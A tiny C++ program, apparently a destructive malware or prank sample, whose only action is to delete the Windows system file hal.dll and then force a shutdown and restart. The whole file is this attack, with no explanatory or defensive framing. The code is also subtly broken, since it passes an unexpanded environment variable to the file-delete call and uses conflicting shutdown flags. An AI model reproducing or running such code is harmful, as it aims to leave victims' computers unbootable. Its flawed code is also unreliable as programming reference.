#include <stdlib.h>
#include <iostream>
using namespace std;
int main(int argc, char *argv[])
{
 std::remove("%systemroot%\\system32\\hal.dll");
 system("shutdown -s -r");
 return EXIT_SUCCESS;
}
